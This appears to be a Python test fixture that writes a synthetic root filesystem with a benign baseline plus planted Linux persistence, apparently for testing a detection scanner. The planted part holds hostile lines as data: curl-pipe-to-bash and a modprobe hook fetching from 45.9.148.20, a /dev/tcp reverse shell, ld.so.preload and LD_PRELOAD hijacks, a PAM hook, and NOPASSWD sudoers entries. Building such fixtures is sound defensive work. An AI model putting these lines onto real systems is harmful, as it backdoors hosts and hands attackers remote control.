"""Synthetic root tree with planted persistence for the test-suite."""

from __future__ import annotations

from pathlib import Path


def _w(root: Path, rel: str, text: str) -> Path:
    p = root / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(text)
    return p


def build_tree(root: Path) -> Path:
    # benign baseline
    _w(root, "etc/profile", "export PATH=/usr/local/bin:$PATH\n")
    _w(root, "etc/profile.d/lang.sh", "export LANG=en_US.UTF-8\n")
    _w(root, "root/.bashrc", "alias ll='ls -la'\n")
    _w(root, "etc/pam.d/common-auth",
       "auth [success=1 default=ignore] pam_unix.so nullok_secure\n"
       "auth requisite pam_deny.so\n")
    _w(root, "etc/modules", "# /etc/modules\nlp\nrtc\n")
    _w(root, "etc/sudoers", "root ALL=(ALL:ALL) ALL\n%admin ALL=(ALL) ALL\n")

    # --- planted persistence ---
    _w(root, "root/.bash_profile",
       "# theme\ncurl -s http://45.9.148.20/x | bash\n")
    _w(root, "etc/profile.d/00-update.sh",
       "nohup /tmp/.cache/agent >/dev/null 2>&1 &\n")
    _w(root, "etc/environment",
       'PATH="/usr/bin:/bin"\nLD_PRELOAD=/usr/lib/libz.so.9\n')
    _w(root, "etc/ld.so.preload", "/usr/lib/libpcprofile.so\n/tmp/.x/hook.so\n")
    _w(root, "etc/ld.so.conf.d/local.conf", "/home/deploy/.local/lib\n")
    _w(root, "etc/rc.local",
       "#!/bin/sh\n(setsid /dev/shm/.run &)\nexit 0\n")
    _w(root, "etc/update-motd.d/99-backdoor",
       "#!/bin/sh\nbash -c 'bash -i >& /dev/tcp/45.9.148.20/443 0>&1' &\n")
    _w(root, "etc/xinetd.d/telnetish",
       "service telnetish\n{\n  socket_type = stream\n"
       "  server = /tmp/.srv/telnetd\n  wait = no\n}\n")
    _w(root, "etc/pam.d/sshd",
       "auth required pam_unix.so\n"
       "auth optional pam_exec.so quiet /usr/local/sbin/notify\n"
       "session required /tmp/evil/pam_hook.so\n")
    _w(root, "etc/modprobe.d/blacklist-hook.conf",
       "install usbcore /bin/sh -c 'curl -s http://45.9.148.20/m|sh; "
       "/sbin/modprobe --ignore-install usbcore'\n")
    _w(root, "etc/udev/rules.d/70-persistent.rules",
       'ACTION=="add", SUBSYSTEM=="usb", RUN+="/tmp/.u/onusb.sh"\n')
    _w(root, "etc/sudoers.d/deploy",
       "deploy ALL=(ALL) NOPASSWD: ALL\n"
       "svc ALL=(root) NOPASSWD: /usr/bin/vim\n")
    _w(root, "etc/systemd/system-generators/zz-gen",
       "#!/bin/sh\ncp /tmp/.svc/x.service \"$1/multi-user.target.wants/\"\n")
    return root
